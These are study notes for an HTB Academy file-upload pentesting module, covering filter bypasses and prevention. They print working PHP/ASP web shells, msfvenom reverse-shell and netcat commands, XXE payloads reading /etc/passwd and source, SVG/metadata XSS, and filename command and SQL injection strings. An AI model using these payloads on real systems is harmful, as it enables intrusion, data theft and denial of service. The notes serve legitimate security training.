---
tags: [htb-academy, web-pentest, file-upload, revision]
module: File Upload Attacks
---

# File Upload Attacks: Revision Notes

> **Legend:** Unmarked = from your module text. **(Extra)** = my own added explanation or example. **⚠ Verify** = unclear or inconsistent in the source.
> **Authorization:** Only upload web shells, reverse shells, XXE/XSS payloads, or decompression/pixel bombs against systems you are explicitly authorized to test. This module covers genuine RCE techniques.
> **Assessment note:** No flags or assessment answers are included. Section 7 gives approach only.

---

## 1. Main Concepts: What, Why, How

### 1.1 Why File Upload Vulnerabilities Matter

- **What:** Letting users upload files is a core feature of modern web apps (profile images, documents, attachments), but it also means the server stores attacker-supplied data if uploads aren't properly filtered/validated.
- **Why it's severe:** File upload vulnerabilities are among the most common found in web/mobile apps (per CVE reports), and most are scored **High or Critical**.
- **Worst case:** An **unauthenticated arbitrary file upload** vulnerability — any unauthenticated user can upload any file type — is one step from full remote code execution (RCE).
- **Root cause:** Weak or missing file validation/verification on the back-end.
- **Beyond RCE — even with a restricted (non-arbitrary) upload, other attacks remain possible:**
  - Introducing XSS or XXE
  - Causing Denial of Service (DoS)
  - Overwriting critical system files/configs
  - And more (covered in §5)
- **Another root cause (not just insecure code):** outdated libraries used for file processing can themselves be vulnerable.

---

## 2. Absent / Weak Validation (Arbitrary File Upload)

### 2.1 Detecting No Validation At All

- **Signs of no restriction:** no mention of allowed file types anywhere in the UI; file picker dialog shows "All Files" with no type filter; any extension (including `.php`) can be selected and its name appears unmodified in the upload form.

### 2.2 Identifying the Web Framework/Language

- **Why it matters:** A web shell **must be written in the same language the web server executes**, since it calls language-specific functions to run system commands — web shells are not cross-platform.
- **Methods to identify the backend language:**
  1. **URL extension:** sometimes directly visible (e.g. `.php`, `.aspx`) — but many frameworks use clean routing, hiding the extension.
  2. **Brute-force the index page extension:** try `/index.php`, `/index.asp`, `/index.aspx`, etc. — if one resolves to the same page, that's a strong hint. Can be automated with Burp Intruder + a web extensions wordlist.
     - **⚠ Caveat (source):** not always accurate — app may not use an index page at all, or may mix multiple extensions.
  3. **Browser extension — Wappalyzer:** passively fingerprints web server, backend language/version, OS, and other tech stack details from the page.
  4. **Web vulnerability scanners:** Burp/ZAP scanners and similar tools can also fingerprint the stack.

### 2.3 Confirming Code Execution

- **Test payload (PHP):**
```php
<?php echo "Hello HTB";?>
```
- Save as `test.php`, upload it, then visit the uploaded file's link.
- **Interpreting the result:**
  - Page prints `Hello HTB` → the `echo` function ran → **PHP code execution confirmed**.
  - Page instead shows the raw source code → the server is **not** executing it as PHP (served as a static/text file instead).

---

## 3. Upload Exploitation

### 3.1 Using Existing Web Shells

- **phpbash:** a terminal-like, semi-interactive PHP web shell.
- **SecLists Web-Shells:** a large collection for many languages/frameworks, found at `/opt/useful/seclists/Web-Shells` on Pwnbox.
- **Workflow:** download the shell for the identified backend language → upload via the vulnerable form → visit the uploaded file's link to interact with it.

### 3.2 Writing a Custom Web Shell

**PHP:**
```php
<?php system($_REQUEST['cmd']); ?>
```
- Upload as `shell.php`, then run commands via `?cmd=id`.
- **Tip from source:** use browser "View Source" (`CTRL+U`) when interacting with this shell in a browser — raw output avoids HTML-rendering artifacts affecting how command output is displayed.

**.NET (ASP):**
```asp
<% eval request('cmd') %>
```
- Same `?cmd=` parameter pattern.

- **General point:** the *concept* (take a `cmd` parameter, pass it to a command-execution function, print output) is portable across languages — only the specific syntax/function changes.
- **When web shells might fail:** the server may have disabled the function the shell relies on (e.g. `system()`), or a WAF may be blocking it — advanced bypasses for this are **out of scope** of this module.

### 3.3 Reverse Shells

- **pentestmonkey PHP reverse shell:** a reliable, well-known option; also available via SecLists.
- **Setup:** edit the IP/port in the script (lines 49–50 in pentestmonkey's script):
```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```
- **Listener:**
```bash
nc -lvnp OUR_PORT
```
- Upload the modified script, visit its link to trigger execution, catch the shell on your listener.

### 3.4 Generating Custom Reverse Shells (msfvenom)

- **Why not just reuse the `system()` web shell pattern for a reverse shell:** less reliable — the raw shell command can fail for various reasons.
- **Better approach:** use core language/framework networking functions, generated automatically via `msfvenom`:
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
- `-p`: the payload (language/type specific, e.g. `php/reverse_php`).
- `-f`: output format (`raw` here, i.e. plain script text).
- Upload `reverse.php`, start a listener, visit the file's link to trigger the callback.
- **Reverse shell vs. web shell trade-off:** reverse shells are generally preferred (more interactive), but may fail due to outbound firewall restrictions or disabled networking functions on the server — web shells are the fallback in those cases.

---

## 4. Bypassing Validation Filters

### 4.1 Client-Side (Front-End) Validation

- **What it looks like:** JS-based checks (`accept=".jpg,.jpeg,.png"` on the `<input>`, plus an `onchange` handler) that block non-matching files **before any request is sent**.
- **Why it's trivial to bypass:** all client-side code executes *in the browser*, which the tester fully controls — if the back-end doesn't independently validate, nothing stops an arbitrary file.

**Bypass method 1 — modify the request directly (Burp):**
1. Capture a normal (valid) upload request.
2. Edit `filename="HTB.png"` to `filename="shell.php"`.
3. Replace the file content (the bytes at the end of the multipart body) with the web shell's PHP code.
4. Forward the request.
- **Note:** `Content-Type` in the request can also be changed, but is usually not load-bearing at this stage (per source).

**Bypass method 2 — disable the front-end check in DevTools:**
1. `CTRL+SHIFT+C` (Firefox Page Inspector) → click the upload element to locate its HTML, e.g.:
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
2. Optionally inspect the validating function via `CTRL+SHIFT+K` (Console) by typing its name (e.g. `checkFile`) to see its logic.
3. Delete the `onchange="checkFile(this)"` attribute directly in the DOM (double-click the attribute in the inspector, delete it).
4. Optionally also remove `accept=".jpg,.jpeg,.png"` to make file selection in the OS dialog easier (not required, just convenient).
- **Note:** this DOM edit is **temporary** (lost on refresh) — that's fine, since it's only needed long enough to get the malicious file through the picker and submitted once.
- **⚠ Browser-specific:** steps shown are for Firefox; other browsers (e.g. Chrome) use different mechanisms (like "overrides") to persist local source edits.

### 4.2 Back-End Blacklist Filters

**Example PHP blacklist:**
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
- **Core weakness:** a blacklist can never be exhaustive — plenty of alternate extensions that still execute as PHP on a typical server are left out.
- **⚠ Case-sensitivity note (source):** this comparison is case-sensitive and only checks lowercase. On **Windows servers** (case-insensitive filenames), a mixed-case extension (e.g. `pHp`) may bypass the check entirely while still executing as PHP.

**Fuzzing for non-blacklisted extensions:**
- Wordlists: PayloadsAllTheThings' PHP/.NET extension lists, or SecLists' common web extensions.
- **Burp Intruder setup:** send the upload request to Intruder → clear auto-set positions → mark just the extension in `filename="HTB.php"` as the fuzz position → load the extension wordlist → **untick URL-encoding** (so the `.` isn't encoded) → Start Attack.
- **Reading results:** sort by response **Length** — requests sharing the same length as a known-successful upload (`File successfully uploaded`) indicate the extension passed the blacklist; others return `Extension not allowed`.
- **Example working bypass extension:** `.phtml` — commonly still executed as PHP by many server configs even when `.php`/`.php7`/`.phps` are blocked.
- **Workflow:** send a found-good extension's request to Repeater, swap in the web shell content, upload, then visit the resulting file to confirm code execution.

### 4.3 Back-End Whitelist Filters

- **General principle:** whitelists are **more secure** than blacklists — only explicitly allowed extensions pass, no need for exhaustive coverage of "bad" ones.
- **Use-case difference:** blacklists suit upload functions needing to allow many file types (e.g. a general file manager); whitelists suit functions that should only ever accept a few types (e.g. profile images). Both can be combined (see §6).

**Example flawed whitelist (regex bug):**
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
- **The bug:** this regex only checks whether the filename **contains** one of the allowed extensions anywhere, not whether it actually **ends** with one — a common developer mistake from weak regex understanding.

#### Double Extensions

- **Technique:** exploit the "contains" bug directly — name the file so it includes a whitelisted extension **and** ends in the real malicious extension, e.g. `shell.jpg.php`.
- **Stricter regex that defeats this:**
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ... }
```
  — the trailing `$` anchors the match to the actual end of the filename, so `shell.jpg.php` no longer passes.

#### Reverse Double Extension

- **What it exploits:** not the upload code itself, but a **web server misconfiguration** that decides which files get PHP execution rights via its own (possibly similarly flawed) regex.
- **Example vulnerable Apache config (`php7.4.conf`):**
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
- This pattern has the same "contains, not ends with" flaw — so a file like `shell.php.jpg` would:
  1. Pass a **strict** filename whitelist (`^.*\.(jpg|jpeg|png|gif)$` — it legitimately ends in `.jpg`).
  2. **Still execute as PHP**, because the Apache handler regex matches `.php` appearing anywhere in the filename.
- **Key insight:** even a perfectly-coded upload filter can be undermined by a separate, insecurely-configured layer (the web server itself).

#### Character Injection

- **Concept:** inject specific characters before/after the real extension to make the **web application's filter** and the **filesystem/OS** interpret the filename differently from each other.

| Character | Use case (per source) |
|---|---|
| `%20` | — |
| `%0a` | — |
| `%00` (null byte) | On **PHP ≤5.X**, truncates the filename at the null byte — `shell.php%00.jpg` gets *stored* as `shell.php` while passing a whitelist expecting `.jpg` |
| `%0d0a` | — |
| `/` | — |
| `.\` | — |
| `.` | — |
| `…` | — |
| `:` (colon) | On **Windows servers**, injecting before the allowed extension (e.g. `shell.aspx:.jpg`) can cause the file to be written as `shell.aspx` |

- **⚠ Note:** the source lists `%20`, `%0d0a`, `/`, `.\`, `.`, `…` as characters "worth trying" without spelling out each one's exact mechanism — only `%00` and `:` get explicit worked explanations. Treat the others as candidates to fuzz, not guaranteed techniques.

**Generating permutations to fuzz (bash):**
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
- Feed the resulting `wordlist.txt` into Burp Intruder against the upload endpoint; success depends heavily on server/PHP version and configuration — these rely on **misconfigurations or outdated systems**, not universal behavior.

---

## 5. Content (Not Just Extension) Validation

### 5.1 Content-Type Header Validation

**Example check:**
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
- **Key weakness:** the `Content-Type` header is set by the **browser client-side**, usually inferred from the file's extension — fully attacker-controllable via request editing.
- **Bypass:** intercept the upload request, change the file's `Content-Type` header (e.g. to `image/jpg`) while keeping the malicious filename/content, forward.
- **⚠ Note on request structure:** a multipart upload request has **two** `Content-Type` headers — one for the overall request, one for the individual file part. Usually you edit the **file's** header, but if the content was sent as plain POST data (no multipart), only the main header may be present/relevant.
- **Fuzzing tip:** SecLists' Content-Type wordlist (`web-all-content-types.txt`) has ~700 entries; filter to just image types (`grep 'image/'`) to cut it to ~45 and speed up testing:
```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

### 5.2 MIME-Type (File Signature / Magic Bytes) Validation

- **What MIME-type checking is:** inspecting the **actual bytes** at the start of a file (its "magic bytes"/file signature) to determine true file type, independent of extension or claimed Content-Type.
- **Why GIF is the easiest to fake:** most image signatures use non-printable bytes, but GIF's signature (`GIF87a` or `GIF89a`) is plain **ASCII printable text** — and just the shared prefix `GIF8` is typically enough to pass MIME detection.

**Demo (Unix `file` command):**
```bash
echo "this is a text file" > text.jpg
file text.jpg
# text.jpg: ASCII text

echo "GIF8" > text.jpg
file text.jpg
# text.jpg: GIF image data
```

**Example PHP MIME check:**
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
- **Bypass:** prepend `GIF8` as the literal first line of the malicious PHP file, keep the `.php` extension (or whatever's needed to trigger execution), upload.
- **Result note:** since `GIF8` is now literally the first line of the script, it will print as **plaintext output** before the rest of the PHP executes (e.g. command output appears right after a `GIF8` line).

### 5.3 Combining Techniques

- When a target enforces **multiple** layers (extension + Content-Type + MIME), you can mix-and-match bypass techniques: e.g. an allowed MIME type with a disallowed Content-Type, an allowed MIME/Content-Type with a disallowed extension, a disallowed MIME/Content-Type with an allowed extension, etc. — systematically permuting which layer you're "satisfying" vs. "attacking" can reveal gaps in how the checks are combined.

---

## 6. Limited (Non-Arbitrary) File Upload Attacks

> Even when arbitrary code execution isn't achievable, a restricted upload (images/documents only) can still enable other real attacks — fuzzing allowed extensions is key to finding which of these apply.

### 6.1 XSS via Uploaded Files

**HTML file upload:** directly embedding `<script>` tags in an uploaded `.html` file — no code execution needed, just stored/served HTML containing JS that runs in a victim's browser when they view it (classic Stored XSS/CSRF vector via a trusted-looking link).

**Image metadata XSS:** inject a payload into a raw-text metadata field (e.g. Comment, Artist) if the app displays that metadata back:
```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```
- **Extra angle:** if you can also get the file served with `Content-Type: text/html`, some apps will render it as HTML outright rather than requiring the metadata to be explicitly displayed.

**SVG-based XSS:** SVGs are XML and support embedded `<script>`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
- Executes whenever the browser renders the uploaded SVG as an image.

### 6.2 XXE via Uploaded Files

**Leak an arbitrary file (e.g. `/etc/passwd`) via SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
- Same concept applies to any XML-based upload format the app parses/renders (plain XML uploads, PDF, Word, PowerPoint — all contain internal XML structure).

**Why reading source code specifically matters for file-upload attacks:** reveals upload directory paths, allowed-extension logic, and file-naming schemes — directly useful for further upload exploitation. Leak PHP source via a PHP filter wrapper:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
- Decode the base64 output to read the raw PHP source.
- **Related attack surface:** XXE in this context can also enable **SSRF** (enumerating internal services, calling internal APIs).

### 6.3 Denial of Service (DoS)

| Technique | How it works |
|---|---|
| **XXE-based DoS** | Covered in more depth in the Web Attacks module (referenced, not detailed here) |
| **Decompression bomb** | Upload a ZIP containing deeply nested ZIPs; if the server auto-extracts, this can expand to many petabytes and crash the host |
| **Pixel flood** | Take a normal JPG/PNG, manually alter its compression metadata to claim an enormous dimension (e.g. `0xffff x 0xffff` → ~4 gigapixels) while the real image stays small; when the server tries to render/process it, it attempts to allocate memory for the claimed size and crashes |
| **Oversized file** | Simply upload a very large file if no size limit is enforced — can fill the disk and crash/slow the server |
| **Directory traversal in upload path** | If the upload function doesn't sanitize the destination path, attempt to write outside the intended directory (e.g. targeting `../../../etc/passwd`), potentially crashing the server or corrupting system files |

---

## 7. Other Upload Attack Techniques

### 7.1 Injection via the File Name Itself

- **Concept:** the **filename string** (not the file's content) is what carries the payload — relevant if the app later processes or displays the filename insecurely.
- **Command injection example:** if the backend later runs something like `mv <filename> /tmp` using the raw uploaded filename, a crafted name can inject a command:
```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```
- **XSS via filename:** `<script>alert(window.origin);</script>.jpg` — triggers if the filename is later displayed unescaped.
- **SQLi via filename:** `file';select+sleep(5);--.jpg` — triggers if the filename is later used unsanitized in a SQL query.

### 7.2 Disclosing the Upload Directory

- **Why this matters:** some upload forms (feedback/submission forms) never give you a direct link to your uploaded file — you need to find the directory to exploit anything.
- **Methods:**
  - Fuzz for likely upload directory names/paths.
  - Chain with other vulnerabilities (LFI/XXE) to read source code and find the real path (see §6.2).
  - **Force an error that leaks the path:**
    - Upload a file with a name that **already exists**, or send two identical upload requests **simultaneously** (race condition-style), to trigger a "could not write file" error that may reveal the directory in its message.
    - Upload a file with an **extremely long name** (e.g. ~5,000 characters) to see if the app mishandles it and leaks path info in an error.

### 7.3 Windows-Specific Techniques

- **Reserved characters:** `|`, `<`, `>`, `*`, `?` — if not sanitized/quoted properly, these can be misinterpreted as wildcards or redirections by the OS, potentially referencing unintended (possibly nonexistent) files and triggering revealing errors.
- **Reserved device names:** `CON`, `COM1`, `LPT1`, `NUL`, etc. — Windows refuses to create a regular file with these names, which can trigger an application error disclosing details.
- **Windows 8.3 short filename convention:**
  - Legacy short-name format using `~` plus a digit for files whose full name exceeds old length limits, e.g. a file called `hackthebox.txt` might also be addressable as `HAC~1.TXT` (or `HAC~2.TXT` for the 2nd matching file starting with `HAC`).
  - **Still supported by modern Windows**, so an attacker can craft a short-form filename to **overwrite an existing file** they otherwise can't directly reference — e.g. uploading something named `WEB~1.CON` to overwrite `web.config`.
  - **Possible outcomes:** information disclosure via resulting errors, DoS, or unauthorized access to/overwriting of sensitive files.

### 7.4 Advanced / Library-Level Vulnerabilities

- **Concept:** any **automated post-processing** applied to an uploaded file (transcoding video, compressing, renaming, thumbnailing, metadata extraction, etc.) is itself an attack surface if the library doing that processing is vulnerable.
- **Example cited (source):** an AVI-upload-triggered XXE vulnerability in **ffmpeg**.
- **Why this is harder to detect generically:** public exploits exist for known vulnerable libraries, but custom/in-house processing code requires deeper analysis — the source points to reading bug bounty reports as a way to build intuition for these more advanced cases, rather than offering a specific technique here.

---

## 8. Prevention Reference

### 8.1 Extension Validation

- **Best practice: use BOTH a whitelist and a blacklist together**, not whitelist alone — the blacklist acts as a safety net if the whitelist is ever bypassed (e.g. via `shell.php.jpg`-style tricks).
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test — checks if the extension exists ANYWHERE in the name
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test — checks the name ENDS WITH an allowed extension
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
- **Note the intentional asymmetry:** the blacklist deliberately checks for the dangerous extension **anywhere** in the filename (catching double-extension and reverse-double-extension tricks), while the whitelist checks the filename **ends with** an allowed one.
- **Apply validation on both front-end AND back-end:** front-end validation alone is bypassable, but it still reduces accidental/incorrect uploads from legitimate users, lowering false-positive noise on any back-end defenses.

### 8.2 Content Validation

- **Never validate extension alone** — always validate content too, and make sure they're **consistent with each other**.
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test — both header AND actual file signature must match
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

### 8.3 Preventing Upload Disclosure

- **Never expose the uploads directory directly** — serve files only through a controlled `download.php`-style script, and return **403 Forbidden** for any direct request to the uploads directory itself.
- **The download script must enforce:**
  - **Authorization checks:** verify the requesting user actually owns/can access the specific file (prevents **IDOR**).
  - **Strict path validation / allowlisting:** never build file paths from unsanitized user input (prevents **LFI**).
- **Security headers to set when serving files:**

| Header | Purpose |
|---|---|
| `Content-Disposition: attachment` | Forces the browser to download rather than render the file inline |
| `Content-Type` | Correct MIME type so the browser handles content appropriately |
| `X-Content-Type-Options: nosniff` | Prevents the browser from MIME-sniffing and overriding the declared type |

- **Randomize stored filenames:** store uploaded files under random/generated names on disk, keep the user's original ("sanitized") filename in a database, and look it up at download time — this hides both the directory structure and real filenames from users, and incidentally defeats filename-injection attacks (§7.1).
- **Isolate the uploads storage:** host uploaded files on a **separate server/container**. If an attacker achieves RCE via an upload, the blast radius is limited to that isolated component, not the main application server.
- **Restrict filesystem access at the web server level:** e.g. PHP's `open_basedir` to prevent the web app from accessing files outside its designated directory tree.

### 8.4 Further Hardening

- **Disable dangerous functions:** PHP's `disable_functions` in `php.ini` — disable `exec`, `shell_exec`, `system`, `passthru`, and similar.
- **Suppress detailed error disclosure:** handle errors at the application level; show generic messages, never raw filenames, directory paths, or stack traces.
- **Additional recommendations:**
  - Limit maximum file size.
  - Keep all processing libraries **up to date**.
  - **Scan uploaded files** for malware/malicious strings.
  - Deploy a **WAF** as a secondary defensive layer.

- **Reporting framing (source's own closing note):** these prevention points double as a practical **checklist** to run through during a pentest/bug bounty report, flagging whichever controls are missing to the development team.

---

## 9. Important Terminology

| Term | Short definition |
|---|---|
| Arbitrary file upload | Vulnerability allowing any file type/content to be uploaded, unrestricted |
| Web shell | An uploaded script that accepts commands and returns their output via the browser; language-specific |
| Reverse shell | An uploaded script that connects back out to an attacker-controlled listener |
| Client-side (front-end) validation | Validation enforced only in browser-executed JS — fully attacker-controllable |
| Blacklist filter | Denies a specific list of forbidden extensions/content; inherently incomplete |
| Whitelist filter | Allows only a specific list of permitted extensions/content; more secure if correctly anchored |
| Double extension | A filename with two extensions (e.g. `shell.jpg.php`) exploiting a non-anchored whitelist regex |
| Reverse double extension | Exploiting a web-server-level (not app-level) misconfigured extension-matching regex |
| Character injection (file upload) | Inserting special characters around an extension to cause mismatched interpretation between filter and filesystem |
| Content-Type header | Client-set HTTP header describing a file's claimed MIME type; attacker-controllable |
| MIME-type / Magic bytes / File signature | The actual byte-level identification of a file's true type, read from its content |
| Pixel flood | DoS via a manipulated image claiming an enormous pixel dimension |
| Decompression bomb | DoS via deeply nested compressed archives expanding to huge sizes on extraction |
| Windows 8.3 short filename | Legacy `~`-based short filename convention still usable to reference/overwrite files on modern Windows |
| IDOR | Insecure Direct Object Reference — accessing another user's resource by manipulating an identifier |
| `open_basedir` | PHP directive restricting a script's filesystem access to a specific directory tree |

---

## 10. Practical Workflow

1. **Confirm authorization and scope.**
2. **Locate any file upload functionality** and observe baseline behavior (allowed types shown in UI, error messages, where uploaded files end up / whether a direct link is given).
3. **Identify the backend language** (URL extension, index-page extension brute-force, Wappalyzer, scanner fingerprinting) — needed to pick the right web shell/reverse shell.
4. **Test for absent validation first:** try uploading a minimal test script (e.g. `<?php echo "Hello HTB";?>`) directly; if it executes, the simplest path (web shell / reverse shell) is open.
5. **If client-side validation blocks the UI:** check DevTools Network tab for an actually-sent request; if front-end-only, bypass via Burp request editing or by deleting the validating JS in DevTools.
6. **If back-end validation blocks a direct attempt:** fuzz for the filter type:
   - Fuzz extensions (Burp Intruder + wordlist) to find a blacklist gap (e.g. `.phtml`).
   - Fuzz extensions against a whitelist to find what's allowed, then test double-extension and reverse-double-extension tricks, and character-injection permutations.
   - Fuzz Content-Type values and test MIME-type (magic byte) spoofing if content-based filtering is suspected.
   - Try combinations across extension/Content-Type/MIME layers if a single-layer bypass fails.
7. **On success, confirm RCE** by visiting the uploaded file and executing a benign command (`id`, `whoami`).
8. **If arbitrary upload isn't achievable, pivot to limited-upload attacks:** test whatever extensions ARE allowed for XSS (HTML/metadata/SVG), XXE (SVG/XML/document formats), or DoS (decompression bomb, pixel flood, oversized file, path traversal in the destination).
9. **Also test the filename itself** as an injection vector (command/XSS/SQLi via filename) and try to force errors that disclose the upload directory.
10. **On Windows targets**, additionally test reserved characters, reserved device names, and 8.3 short-filename tricks.
11. **Document findings:** which validation layers existed, which were bypassed and how, what impact was achieved (RCE vs. XSS vs. DoS vs. info disclosure), and map each finding to the relevant prevention measure in §8.

### Common Mistakes
- Assuming a blocked UI means the back-end is also validated — always verify independently (check Network tab / test directly).
- Giving up after a whitelist blocks the obvious extension without testing double-extension or character-injection variants.
- Forgetting to un-tick URL-encoding in Burp Intruder when fuzzing extensions containing `.` characters.
- Editing only the main request `Content-Type` header when the relevant one is actually the per-file part's header (or vice versa).
- Assuming GIF-magic-byte spoofing alone defeats every content filter — remember Content-Type header and MIME-type are two **separate** checks that may both be present.
- Not considering that a perfectly-coded upload whitelist can still be undermined by a misconfigured web server handler regex (reverse double extension).
- Overlooking limited-upload attack surface (XSS/XXE/DoS) when arbitrary upload isn't achievable — a "secure" upload form isn't necessarily a dead end.
- Forgetting the filename itself (not just the file content) is a separate injection surface.
- On Windows-hosted apps, forgetting reserved names/characters and the 8.3 short-filename trick as info-disclosure/overwrite vectors.

### Troubleshooting
- **Web shell doesn't execute:** check whether required functions (`system()`, etc.) are disabled server-side, or whether a WAF is blocking the request — may need techniques beyond this module's scope.
- **Reverse shell doesn't connect back:** likely an outbound firewall on the target network, or disabled networking functions — fall back to a web shell.
- **Extension fuzzing shows everything blocked:** check if it's actually a content-based (Content-Type/MIME) filter instead — error message changing (or not) based on filename vs. based on content is a good diagnostic signal.
- **Double extension fails:** the whitelist regex is likely properly anchored with `$` — try reverse double extension (server misconfig) or character injection instead.
- **Can't find the uploaded file's URL:** try forcing a write-error (duplicate filename, very long filename, simultaneous identical requests) to leak the path, or chain with LFI/XXE to read source and find the real upload path/naming scheme.

---

## 11. Quick Revision Sheet

### 11.1 Top 10 Things to Remember
1. File upload vulnerabilities are common and frequently High/Critical severity — root cause is weak/missing back-end validation (or outdated processing libraries).
2. Web shells must match the backend language; identify it via URL extension, index-page brute-forcing, or Wappalyzer before choosing a payload.
3. Client-side validation is always bypassable — either edit the request directly (Burp) or delete the validating JS in DevTools.
4. Blacklist filters are inherently incomplete (and often case-sensitive, bypassable via mixed case on Windows); fuzz for allowed extensions they missed (e.g. `.phtml`).
5. Whitelist filters are stronger but commonly broken by a non-anchored regex — exploit via double extensions (`shell.jpg.php`) unless `$`-anchored.
6. Reverse double extension exploits a **web server config** flaw (not the app's own filter) — a strict app whitelist doesn't protect against this.
7. Content validation (Content-Type header + MIME/magic-byte check) is separate from extension validation — both must be defeated independently; `GIF8` is the easiest magic-byte signature to fake.
8. Even limited (image/document-only) uploads can enable XSS (HTML/metadata/SVG), XXE (SVG/XML/documents — also usable to read source code), and DoS (decompression bombs, pixel floods, oversized files, path traversal).
9. The filename itself (not just content) can carry command/XSS/SQL injection if displayed or processed insecurely elsewhere.
10. Prevention = whitelist AND blacklist together, validate content AND extension together, hide the uploads directory behind an authorization-checked download script, randomize stored filenames, isolate upload storage, disable dangerous functions, and suppress detailed errors.

### 11.2 Compact Technique Reference

| Goal | Technique |
|---|---|
| Identify backend language | `/index.php`, `/index.asp`, etc.; Wappalyzer; scanner |
| Confirm code execution | `<?php echo "Hello HTB";?>` test upload |
| Bypass front-end validation | Edit raw request in Burp, or delete validating JS in DevTools |
| Bypass extension blacklist | Fuzz extensions (e.g. `.phtml`); try mixed case on Windows |
| Bypass extension whitelist (loose regex) | Double extension: `shell.jpg.php` |
| Bypass extension whitelist (strict regex) | Reverse double extension: `shell.php.jpg` + server misconfig |
| Bypass extension whitelist (either) | Character injection: `%00`, `:`, etc. around the extension |
| Bypass Content-Type filter | Edit the file's `Content-Type` header in the request |
| Bypass MIME-type filter | Prepend `GIF8` magic bytes to the malicious file |
| XSS via upload | HTML file, image metadata (exiftool), or SVG `<script>` |
| XXE via upload | SVG/XML `SYSTEM "file:///..."` or `php://filter/convert.base64-encode/resource=...` |
| DoS via upload | Decompression bomb, pixel flood, oversized file, path traversal |
| Injection via filename | `file$(whoami).jpg`, `<script>...</script>.jpg`, `file';select+sleep(5);--.jpg` |
| Disclose upload directory | Duplicate/simultaneous filename, overly long filename |
| Windows-specific | Reserved chars (`\|<>*?`), reserved names (`CON`, `NUL`), 8.3 short names (`WEB~1.CON`) |

### 11.3 Common Mistakes to Avoid
- Trusting UI-level blocking as proof of back-end validation.
- Stopping at one bypass technique instead of testing the full escalation ladder.
- Forgetting Content-Type and MIME-type are separate, both-must-fail-independently checks.
- Missing limited-upload attack surface when arbitrary upload isn't achievable.
- Ignoring the filename itself as an injection vector.

### 11.4 Revision Questions

1. **Why must a web shell be written in the same language as the target web server?**
   It needs to call language-specific functions to execute system commands, so web shells are inherently non-cross-platform.
2. **Why does the GIF file signature make it the easiest image type to spoof for MIME-type bypass?**
   Unlike most other image formats with non-printable byte signatures, GIF's signature (`GIF87a`/`GIF89a`) is ASCII printable text, and the shared `GIF8` prefix alone is usually sufficient.
3. **What's the key regex flaw that enables the double-extension bypass?**
   The whitelist regex checks only whether the filename *contains* an allowed extension, not whether it *ends with* one — fixed by anchoring with `$`.
4. **How does the reverse double extension technique differ from the regular double extension technique?**
   It exploits a flaw in the **web server's** own file-handler matching regex (e.g. Apache's `FilesMatch`) rather than the upload form's own filter, so it can succeed even against a strict, correctly-anchored application-level whitelist.
5. **Why is Content-Type header validation alone insufficient?**
   The header is set client-side by the browser (usually from the file extension) and is therefore fully attacker-controllable by editing the raw request.
6. **What two things does MIME-type/magic-byte validation inspect that Content-Type header validation does not?**
   The actual byte content of the file (its true file signature), independent of what the client claims via extension or header.
7. **Name two non-RCE attacks achievable via an SVG upload.**
   XSS (via an embedded `<script>` tag) and XXE (via a malicious `DOCTYPE`/entity declaration, e.g. to read local files or source code).
8. **Why is randomizing stored filenames (with original names kept in a database) a recommended defense?**
   It hides both the real upload directory structure and filenames from users/attackers, and incidentally defeats filename-based injection attacks.
9. **Why should a blacklist and whitelist be combined rather than relying on a whitelist alone?**
